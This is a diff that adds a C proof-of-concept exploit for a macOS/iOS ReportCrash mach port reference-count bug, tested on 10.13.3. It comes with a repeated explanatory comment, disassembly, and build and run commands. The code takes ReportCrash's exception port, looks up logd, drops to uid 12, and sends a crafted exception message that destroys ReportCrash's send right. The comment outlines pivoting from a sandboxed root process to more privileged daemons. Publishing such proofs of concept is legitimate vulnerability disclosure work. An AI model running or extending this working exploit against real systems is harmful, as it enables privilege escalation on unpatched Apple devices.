@@ -1,0 +1,208 @@
+/*
+ReportCrash is the daemon responsible for making crash dumps of crashing userspace processes.
+Most processes can talk to ReportCrash via their exception ports (either task or host level.)
+
+You would normally never send a message yourself to ReportCrash but the kernel would do it
+on your behalf when you crash. However using the task_get_exception_ports or host_get_exception_ports
+MIG kernel methods you can get a send right to ReportCrash.
+
+ReportCrash implements a mach_exc subsystem (2405) server and expects to receive
+mach_exception_raise_state_identity messages. The handler for these messages is at +0x2b11 in 10.13.3.
+
+The handler compares its euid with the sender's; if they are different it jumps straight to the error path:
+
+__text:0000000100002BD5                 cmp     rbx, rax
+__text:0000000100002BD8                 mov     r14d, 5
+__text:0000000100002BDE                 jnz     loc_100002DCF
+
+__text:0000000100002DCF                 mov     rbx, cs:_mach_task_self__ptr
+__text:0000000100002DD6                 mov     edi, [rbx]      ; task
+__text:0000000100002DD8                 mov     rsi, qword ptr [rbp+name] ; name
+__text:0000000100002DDC                 call    _mach_port_deallocate
+__text:0000000100002DE1                 mov     edi, [rbx]      ; task
+__text:0000000100002DE3                 mov     esi, r12d       ; name
+__text:0000000100002DE6                 call    _mach_port_deallocate
+__text:0000000100002DEB                 mov     rax, cs:___stack_chk_guard_ptr
+__text:0000000100002DF2                 mov     rax, [rax]
+__text:0000000100002DF5                 cmp     rax, [rbp+var_30]
+__text:0000000100002DF9                 jnz     loc_10000314E
+__text:0000000100002DFF                 mov     eax, r14d
+
+
+This error path drops a UREF on the task and thread port arguments then returns error code 5.
+
+MIG will see this error and drop another UREF on the thread and port arguments. As detailed in
+the mach_portal exploit [https://bugs.chromium.org/p/project-zero/issues/detail?id=959] such bugs can
+be used to replace privileged port names leading to exploitable conditions.
+
+Since this path will only be triggered if you can talk to a ReportCrash running with a different euid
+a plausible exploitation scenario would be trying to pivot from code execution in a sandbox root process
+to another one with more privileges (eg kextd on MacOS or amfid on iOS) going via ReportCrash (as ReportCrash
+will get sent their task ports if you can crash them.)
+
+This PoC demonstrates the bug by destroying ReportCrash's send right to logd; use a debugger or lsmp to see
+what's happening.
+
+Tested on MacOS 10.13.3 17D47
+*/
+
+// ianbeer
+
+#if 0
+MacOS/iOS ReportCrash mach port replacement due to failure to respect MIG ownership rules
+
+ReportCrash is the daemon responsible for making crash dumps of crashing userspace processes.
+Most processes can talk to ReportCrash via their exception ports (either task or host level.)
+
+You would normally never send a message yourself to ReportCrash but the kernel would do it
+on your behalf when you crash. However using the task_get_exception_ports or host_get_exception_ports
+MIG kernel methods you can get a send right to ReportCrash.
+
+ReportCrash implements a mach_exc subsystem (2405) server and expects to receive
+mach_exception_raise_state_identity messages. The handler for these messages is at +0x2b11 in 10.13.3.
+
+The handler compares its euid with the sender's; if they are different it jumps straight to the error path:
+
+__text:0000000100002BD5                 cmp     rbx, rax
+__text:0000000100002BD8                 mov     r14d, 5
+__text:0000000100002BDE                 jnz     loc_100002DCF
+
+__text:0000000100002DCF                 mov     rbx, cs:_mach_task_self__ptr
+__text:0000000100002DD6                 mov     edi, [rbx]      ; task
+__text:0000000100002DD8                 mov     rsi, qword ptr [rbp+name] ; name
+__text:0000000100002DDC                 call    _mach_port_deallocate
+__text:0000000100002DE1                 mov     edi, [rbx]      ; task
+__text:0000000100002DE3                 mov     esi, r12d       ; name
+__text:0000000100002DE6                 call    _mach_port_deallocate
+__text:0000000100002DEB                 mov     rax, cs:___stack_chk_guard_ptr
+__text:0000000100002DF2                 mov     rax, [rax]
+__text:0000000100002DF5                 cmp     rax, [rbp+var_30]
+__text:0000000100002DF9                 jnz     loc_10000314E
+__text:0000000100002DFF                 mov     eax, r14d
+
+
+This error path drops a UREF on the task and thread port arguments then returns error code 5.
+
+MIG will see this error and drop another UREF on the thread and port arguments. As detailed in
+the mach_portal exploit [https://bugs.chromium.org/p/project-zero/issues/detail?id=959] such bugs can
+be used to replace privileged port names leading to exploitable conditions.
+
+Since this path will only be triggered if you can talk to a ReportCrash running with a different euid
+a plausible exploitation scenario would be trying to pivot from code execution in a sandbox root process
+to another one with more privileges (eg kextd on MacOS or amfid on iOS) going via ReportCrash (as ReportCrash
+will get sent their task ports if you can crash them.)
+
+This PoC demonstrates the bug by destroying ReportCrash's send right to logd; use a debugger or lsmp to see
+what's happening.
+
+Tested on MacOS 10.13.3 17D47
+
+build: cp /usr/include/mach/mach_exc.defs . && mig mach_exc.defs && clang -o rc rc.c mach_excUser.c
+run: sudo ./rc
+
+#endif
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <servers/bootstrap.h>
+#include <mach/mach.h>
+#include <mach/task.h>
+
+#include "mach_exc.h"
+#include <mach/exception_types.h>
+
+
+void drop_ref(mach_port_t report_crash_port, mach_port_t target_port) {
+  int flavor = 0;
+  mach_msg_type_number_t new_stateCnt = 0;
+  kern_return_t err = mach_exception_raise_state_identity(
+        report_crash_port,
+        target_port,
+        MACH_PORT_NULL,
+        0,
+        0,
+        0,
+        &flavor,
+        NULL,
+        0,
+        NULL,
+        &new_stateCnt);
+}
+
+int main() {
+  int uid = getuid();
+  if (uid != 0) {
+    printf("this PoC should be run as root\n");
+    return 0;
+  }
+  // take a look at our exception ports:
+  exception_mask_t masks[EXC_TYPES_COUNT] = {0};
+  mach_msg_type_number_t count = EXC_TYPES_COUNT;
+  mach_port_t ports[EXC_TYPES_COUNT] = {0};
+  exception_behavior_t behaviors[EXC_TYPES_COUNT] = {0};
+  thread_state_flavor_t flavors[EXC_TYPES_COUNT] = {0};
+
+  kern_return_t err = host_get_exception_ports(mach_host_self(),
+  //kern_return_t err = task_get_exception_ports(mach_task_self(),
+                                               EXC_MASK_ALL,
+                                               masks,
+                                               &count,
+                                               ports,
+                                               behaviors,
+                                               flavors);
+  
+  if (err != KERN_SUCCESS) {
+    printf("failed to get the exception ports\n");
+    return 0;
+  }
+
+  printf("count: %d\n", count);
+
+  mach_port_t report_crash_port = MACH_PORT_NULL;
+  
+  for (int i = 0; i < count; i++) {
+    mach_port_t port = ports[i];
+    exception_mask_t mask = masks[i];
+
+    printf("port: %x %08x\n", port, mask);
+
+    if (mask & (1 << EXC_RESOURCE)) {
+      report_crash_port = port;
+    }
+  }
+  
+  if (report_crash_port == MACH_PORT_NULL) {
+    printf("couldn't find ReportCrash port\n");
+    return 0;
+  }
+
+  printf("report crash port: 0x%x\n", report_crash_port);
+
+  // the port we will target:
+  mach_port_t bs = MACH_PORT_NULL;
+  task_get_bootstrap_port(mach_task_self(), &bs);
+  printf("targeting bootstrap port: %x\n", bs);
+
+  mach_port_t service_port = MACH_PORT_NULL;
+  err = bootstrap_look_up(bs, "com.apple.logd", &service_port);
+  if(err != KERN_SUCCESS){
+    printf("unable to look up target service\n");
+    return 0;
+  }
+  printf("got service: 0x%x\n", service_port);
+
+  // triggering the bug requires that we send from a different uid
+  // drop to everyone(12)
+
+  int setuiderr = setuid(12);
+  if (setuiderr != 0) {
+    printf("setuid failed...\n");
+    return 0;
+  }
+  printf("dropped to uid 12\n");
+
+  drop_ref(report_crash_port, service_port);
+
+  return 0;
+}
